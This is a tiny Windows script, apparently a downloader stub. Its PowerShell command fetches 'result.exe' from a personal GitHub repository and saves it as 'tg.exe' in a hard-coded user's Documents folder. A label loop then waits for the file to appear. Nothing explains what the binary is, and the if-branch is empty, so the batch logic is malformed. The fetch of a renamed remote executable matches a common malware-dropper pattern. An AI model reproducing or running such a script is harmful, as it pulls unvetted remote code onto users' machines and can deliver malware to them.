PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\hhaam687\Documents\tg.exe')"

:check
	if "C:\Users\hhaam687\Documents\tg.exe" exist (
	
	) else ( 
		goto check
	)
